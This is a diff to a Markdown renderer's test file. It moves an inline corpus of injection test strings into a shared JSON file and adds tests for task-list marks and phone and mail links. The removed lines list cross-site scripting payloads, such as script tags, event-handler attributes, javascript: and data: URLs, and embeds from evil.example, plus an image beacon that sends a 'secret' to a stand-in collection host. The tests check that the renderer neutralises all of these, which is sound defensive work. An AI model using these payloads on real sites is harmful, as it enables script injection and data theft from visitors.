@@ -3,6 +3,7 @@ import { cleanup, render, screen } from "@testing-library/react";
 import { afterEach, expect, test } from "vitest";
 
 import { safeHref } from "./links";
+import corpus from "./gallery/injection.json?raw";
 import Markdown from "./Markdown";
 
 afterEach(cleanup);
@@ -67,29 +68,8 @@ test("half-finished Markdown, as it arrives mid-stream, renders without error", 
   }
 });
 
-// The security corpus (M3 security tests): nothing here may run, load or style anything.
-const CORPUS = [
-  "<script>window.hacked = 1</script>",
-  '<img src="x" onerror="window.hacked = 1">',
-  "[click](javascript:window.hacked=1)",
-  "[click](JaVaScRiPt:window.hacked=1)",
-  "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
-  "[click](vbscript:msgbox)",
-  '<a href="javascript:window.hacked=1">an HTML link</a>',
-  "<javascript:window.hacked=1>",
-  "[ref]\n\n[ref]: javascript:window.hacked=1",
-  '<iframe src="https://evil.example"></iframe>',
-  '<svg onload="window.hacked=1"><circle r="1"/></svg>',
-  '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x">',
-  "<style>body { display: none }</style>",
-  '<div style="background:url(https://evil.example/x)">styled</div>',
-  '<link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=https://evil.example">',
-  "![leak](https://evil.example/collect?secret=what-the-visitor-typed)",
-  "![leak](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=)",
-  '<details open ontoggle="window.hacked=1">x</details>',
-  "```html\n<script>window.hacked = 1</script>\n```",
-  "[nested ![img](https://evil.example/a.png)](javascript:window.hacked=1)",
-];
+// The security corpus (M3 security tests), shared with the browser tests: nothing here may run, load or style anything.
+const CORPUS: string[] = JSON.parse(corpus);
 
 test.each(CORPUS)("the injection attempt %j runs, loads and styles nothing", (attempt) => {
   const box = draw(attempt);
@@ -102,4 +82,19 @@ test.each(CORPUS)("the injection attempt %j runs, loads and styles nothing", (at
   }
   for (const link of box.querySelectorAll("a")) expect(safeHref(link.getAttribute("href"))).not.toBeNull();
   expect((window as { hacked?: number }).hacked).toBeUndefined();
+});
+
+test("a task list's boxes are named marks, not controls", () => {
+  draw("- [x] Visa letter printed\n- [ ] Bank letter requested");
+
+  expect(screen.getByRole("img", { name: "Done" })).toBeTruthy();
+  expect(screen.getByRole("img", { name: "Not done" })).toBeTruthy();
+  expect(document.querySelector("input")).toBeNull();
+});
+
+test("a phone number links to a call, as a mail address links to a message", () => {
+  draw("Call [+44 20 7000 0000](tel:+442070000000) or write to <help@example.org>.");
+
+  expect(screen.getByRole("link", { name: "+44 20 7000 0000" }).getAttribute("href")).toBe("tel:+442070000000");
+  expect(screen.getByRole("link", { name: "help@example.org" }).getAttribute("href")).toBe("mailto:help@example.org");
 });
